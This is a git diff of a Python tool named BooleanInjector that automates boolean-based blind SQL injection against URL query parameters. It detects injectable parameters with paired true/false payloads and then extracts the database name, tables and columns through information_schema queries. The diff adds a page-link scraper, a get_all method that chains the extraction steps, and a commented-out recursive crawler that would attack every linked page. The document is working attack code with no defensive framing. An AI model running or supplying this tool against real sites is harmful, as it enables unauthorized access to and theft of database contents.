@@ -1,6 +1,7 @@
 from typing import Literal
 
 import requests
+from bs4 import BeautifulSoup
 from prettytable import PrettyTable
 from requests import Response
 from termcolor import colored
@@ -17,16 +18,23 @@ def get_time():
     return f"[{colored(f"{datetime.datetime.now().strftime('%H:%M:%S.%f')}", "light_cyan")}]"
 
 
-def restrict_values(values: list):
-    def decorator(func):
-        def wrapper(*args, **kwargs):
-            if args and args[0] not in values:
-                raise ValueError
-            return func(*args, **kwargs)
+# def restrict_values(values: list):
+#     def decorator(func):
+#         def wrapper(*args, **kwargs):
+#             if args and args[0] not in values:
+#                 raise ValueError
+#             return func(*args, **kwargs)
+#
+#         return wrapper
+#
+#     return decorator
 
-        return wrapper
-
-    return decorator
+def get_hrefs(url: str) -> list:
+    a_list = BeautifulSoup(requests.get(url).text, features="html.parser").findAll(name="a", recursive=True)
+    href_list = []
+    for a in a_list:
+        href_list.append(a.get("href"))
+    return href_list
 
 
 def parse_url(url: str):
@@ -43,12 +51,22 @@ def parse_url(url: str):
             pairs[p[0]] = p[1]
         return pairs
     else:
-        print(fatal, "url中需带有查询参数")
-        exit()
+        print(get_time(), fatal, "url中需带有查询参数")
 
 
 class BooleanInjector:
-    def __init__(self, url: str, cookie=None, use_cookie: bool = False, show_payload: bool = False):
+    def __init__(self, url: str,
+                 cookie: dict = None,
+                 use_cookie: bool = False,
+                 show_payload: bool = False,
+                 is_recursive: bool = False):
+        """
+        :param url: 目标url
+        :param cookie: cookie内容,需求类型为字典
+        :param use_cookie: 是否使用cookie,bool类型
+        :param show_payload: 是否显示成功注入时所使用的payload:bool类型
+        :param is_recursive: 是否在
+        """
         self.show_payload = show_payload
         self.normal_response: Response = requests.get(url=url, cookies=cookie)
         self.raw_url = url
@@ -63,18 +81,21 @@ class BooleanInjector:
         self.injectable_params: list = []
         self.injection_types: list = []
         self.injectable_params_count: int = len(self.injectable_params)
+
+        self.hrefs = get_hrefs(self.target_url) if is_recursive else []
+
         self.db_length = 0
         self.db_name = ""
 
         self.tables = []
         self.columns, self.rows = {}, {}
-
+        # for pretty_table
         self.ptable = PrettyTable()
         self.ptable.field_names = []
 
         self.test_injection_points()
 
-        print(get_time(), "\n", f"[{colored("initialization", "light_blue")}]", sep="")
+        print(get_time(), "\n", f"[{colored("initialization", "light_blue", "on_black")}]", sep="")
         print("url:", self.raw_url)
         print("Cookies:", self.cookie if self.use_cookie else "No Cookies")
         print("params_count:", self.params_count)
@@ -96,9 +117,8 @@ class BooleanInjector:
             response_false = self.get_payload_result(payload_false, i, "number")
             if response_true and not response_false:
                 # if self.get_payload_result(payload_true, i, "number"):
-                print(get_time(), info, f"Got injectable param:{self.params[i]} (type:number)")
-                if self.show_payload:
-                    print("by using payload:\n", colored(self.construct_payload(payload_false, i, inject_type="number"), "cyan"))
+                print(get_time(), info, f"Got injectable param:{self.params[i]} (type:number)"
+                      f"by using payload:\n{colored(self.construct_payload(payload_false, i, inject_type="number"), "cyan")}" if self.show_payload else "")
                 self.injectable_params. append(i)
                 self.injection_types.append("number")
             else:
@@ -109,10 +129,7 @@ class BooleanInjector:
                 response_false = self.get_payload_result(payload_false, i, "char")
                 if response_true and not response_false:
                     print(get_time(), info, f"Got injectable param:{self.params[i]} (type:char)",
-                          colored(self.construct_payload(payload_false, i, inject_type="char"), "cyan"))
-                    if self.show_payload:
-                        print("by using payload:\n",
-                              colored(self.construct_payload(payload_false, i, inject_type="number"), "cyan"))
+                          f"by using payload:\n{colored(self.construct_payload(payload_false, i, inject_type="char"), "cyan")}" if self.show_payload else "")
                     self.injectable_params.append(i)
                     self.injection_types.append("char")
 
@@ -136,7 +153,7 @@ class BooleanInjector:
             if inject_param in self.injectable_params:
                 t = self.injection_types[self.injectable_params.index(inject_param)]
             else:
-                print(fatal)
+                print(get_time(), fatal, f"unexpected parameter{inject_param}")
                 exit()
         else:
             t = inject_type
@@ -145,17 +162,11 @@ class BooleanInjector:
         for i in range(0, self.params_count):
             payload += f"{self.params[i]}={self.values[i] + ("'" if t == "char" and i == point else "") + (f" {sqli}" if i == point else "") + ("&" if i != self.params_count - 1 else "")}"
 
-        if r == 0:
-            # print("r=0")
-            pass
-        elif r == 1:
-            # print("r=1")
+        if r == 1:
             payload = payload.replace(" and ", "+and+").replace("#", "%23").replace("=", "%3D").replace("'", "%27")
-                # .replace(" ", "%20")
+            # .replace(" ", "%20")
             for param in self.params:
                 payload = payload.replace(f"{param}%3D", f"{param}=")
-        elif r == 2:
-            pass
         # reserve
         # print(payload)
         return payload
@@ -174,7 +185,7 @@ class BooleanInjector:
             payload = self.construct_payload(sqli, point, r, inject_type)
             sqli_response = requests.get(url=payload, cookies=self.cookie)
             # print(get_time(), "[info]", "payload constructed:", payload)
-            # 确认条件
+            # 判断条件,可能需要扩展一下以应对更多情况,例如无法确认是否为正确回显
             if self.normal_response.text == sqli_response.text:
                 # if self.show_payload:
                 # print("\n"+payload)
@@ -279,7 +290,6 @@ class BooleanInjector:
         for point in self.injectable_params:
             # get column count
             for table in self.tables:
-                ptable_row = [table]
                 columns_count = 0  # store the count of column in this table
                 for c in range(1, 32):
                     payload = f"and if((select count(column_name) from information_schema.columns where table_schema=database() and table_name='{table}')={c},1,0)#"
@@ -325,6 +335,19 @@ class BooleanInjector:
                     if self.show_payload:
                         for p in payload_list:
                             print(colored(p, "cyan"))
+
+    def get_all(self):
+        self.get_db_length()
+        self.get_db_name()
+        self.get_tables()
+        self.get_columns()
+
+    # !! extremely unstable method, don't use it !!
+    # def recursive(self):
+    #     for href in self.hrefs:
+    #         sqli = BooleanInjector(url=href, cookie=self.cookie, use_cookie=self.use_cookie, show_payload=self.show_payload, is_recursive=True)
+    #         sqli.get_all()
+    #         sqli.recursive()
 
     def display(self):
         print(self.ptable)
